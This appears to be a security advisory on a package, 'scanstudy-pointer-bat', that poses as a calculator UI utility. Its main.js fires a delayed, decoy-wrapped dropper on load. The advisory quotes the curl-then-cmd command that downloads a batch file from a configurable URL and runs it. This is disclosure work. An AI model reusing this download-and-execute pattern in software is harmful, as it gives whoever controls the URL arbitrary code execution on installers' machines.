summary: scanstudy-pointer-bat ships a Windows.bat dropper that fires on module load
details: The package advertises itself as a calculator UI utility but main.js schedules a child_process.exec via setTimeout on require/start that runs `curl -fsSL ${rendererUrl} -o render.bat && cmd /c start /b render.bat`, downloading a file from a configured URL and executing it as render.bat under cmd. The RENDERER_URL key is absent from the shipped config.json, so the current artifact resolves to an empty URL, but the full download-and-execute machinery is present and reachable on load, giving whoever controls that config key arbitrary code execution on the installer's Windows host. main.js also contains an unused Mandelbrot-style CPU-busy routine (`performRoutine`) and wraps the exec in a random 0–5 second delay — decoy and timing patterns around the shell-out that are inconsistent with the stated library purpose.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
